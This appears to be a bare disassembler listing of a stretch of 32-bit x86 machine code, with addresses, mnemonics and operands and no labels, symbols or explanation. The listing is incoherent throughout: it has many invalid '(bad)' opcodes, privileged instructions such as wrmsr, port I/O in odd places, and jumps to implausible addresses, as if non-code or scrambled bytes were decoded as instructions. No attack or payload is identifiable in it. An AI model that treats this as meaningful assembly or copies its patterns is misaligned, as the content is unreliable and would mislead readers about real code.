  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
